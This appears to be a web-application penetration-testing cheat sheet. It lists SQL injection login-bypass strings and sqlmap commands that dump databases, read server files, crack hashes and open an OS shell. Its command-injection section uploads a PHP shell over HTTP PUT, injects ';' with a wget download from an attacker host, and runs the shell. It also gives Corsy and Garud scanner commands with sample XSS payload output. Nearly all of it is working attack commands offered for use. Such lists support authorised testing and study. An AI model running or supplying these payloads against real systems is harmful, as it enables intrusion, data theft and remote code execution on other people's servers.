# WebApp

## SQLInjections

Common Injections for Login Forms:
```
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1—
```

## domain-to-webapp
```
./webAppChecker www.example.com ./ouput_dir ./scope.txt
```

## SQLMAP

Automated scan
```
sqlmap -u http://example.com –forms –batch –crawl=10 –cookie=jsessionid=54321 –level=5 –risk=3
```

Targeted scan
```
sqlmap -u http://example.com -p PARAM –data=POSTDATA –cookie=COOKIE –level=3 –current-user –current-db –passwords –file-read=”/var/www/blah.php”
```

Scan url for union AND error based injection with MYSQL backend AND use a random user agent AND database dump
```
sqlmap -u “http://example.com/vuln.php?id=1” –dbms=mysql –tech=U –random-agent –dump
```

Find forms for injections
```
sqlmap -o -u “http://meh.com/form/” –forms
```

Dump + crack hashes for table users on database-name
```
sqlmap -o -u “http://meh/vuln-form” –forms -D database-name -T users –dump
```

Flushes the session
```
sqlmap --flush session
```

Attempts to exploit the “user” field using boolean technique
```
sqlmap -p user --technique=B
```

Capture a request via Burp Suite, save it to a file, and use this command to let sqlmap automate everything. Add –os-shell at the end to pop a shell if possible
```
sqlmap -r <captured request>
```

## Command Injection

File Traverse
```
website.com/file.php[?path=/]
```

Test HTTP options using curl
```
curl -vX OPTIONS [website]
```

Upload file using CURL to website with PUT option available
```
curl --upload-file shell.php --url http://192.168.218.139/test/shell.php --http1.0
```

Transfer file
```
?path=/; wget http://IPADDRESS:8000/FILENAME.EXTENTION;
```

Activate shell file
```
; php -f filelocation.php;
```

## Corsy
* Scans for all known misconfigurations in CORS implementations.

Standard scan
```
python3 corsy.py -u https://example.com
```
Scan URLs from a file
```
python3 corsy.py -i /path/urls.txt
```
Scan URLs from stdin
```
cat urls.txt | python3 corsy.py
```
Number of threads
```
python3 corsy.py -u https://example.com -t 20
```
Delay between requests
```
python3 corsy.py -u https://example.com -d 2
```
Export results to JSON
```
python3 corsy.py -i /path/urls.txt -o /path/output.json
```
Custom HTTP headers
```
python3 corsy.py -u https://example.com --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
```

## Garud
* Find injections points

Example Usage
```
garud -d hackerone.com
```
Exclude out of scope domains
```
echo test.hackerone.com > ossdomain.txt
garud -d hackerone.com -x ~/ossdomain.txt
```
With all flags
```
garud -d hackerone.com -j -s -x /home/oss.txt
```
Hide output in the terminal
```
garud -d hackerone.com -s
```
Store output in a single json file
```
garud -d hackerone.com -s -j
cd hackerone
cat output.json | jq
{
  "nuclei_critical": [],
  "vuln_crlf": [],
  "dalfox": [
    "[POC][V][GET][inATTR-double(3)-URL] http://subdomain.target.tld/hpp?pp=FUZZ%22onpointerout%3Dconfirm.call%28null%2C1%29+class%3Ddalfox+",
    ----------------------snip----------------------
    "subdomains": [
      "sub.target.tld",
      "tub.target.tld",
      "subdomain.target.tld"
  ],
  "vuln_xss": [
    "[POTENTIAL XSS] - http://subdomain.target.tld/hpp/?pp=%22%3E%2F%3E%3Csvg%2Fonload%3Dconfirm%28document.domain%29%3E ",
    "[POTENTIAL XSS] - http://subdomain.target.tld:80/hpp/?pp=%22%3E%2F%3E%3Csvg%2Fonload%3Dconfirm%28document.domain%29%3E ",
    "[POTENTIAL XSS] - http://subdomain.target.tld:80/hpp/index.php?pp=%22%3E%2F%3E%3Csvg%2Fonload%3Dconfirm%28document.domain%29%3E "
  ]
}
```
